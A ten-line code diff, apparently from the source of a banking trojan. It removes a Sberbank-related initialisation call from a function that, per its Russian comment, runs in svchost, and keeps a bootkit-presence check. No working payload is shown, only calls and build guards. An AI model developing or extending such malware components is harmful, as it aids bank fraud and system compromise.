@@ -86,10 +86,6 @@ void SVChostStart(PEventData Data, bool &Cancel)
 {
 	// Запущена функция работающая в процессе svchost
 
-	#ifdef SBERH
-		FirstInitSber();
-	#endif
-	
 	#ifdef bootkitH
 		IsBootkitInstaled();
 	#endif
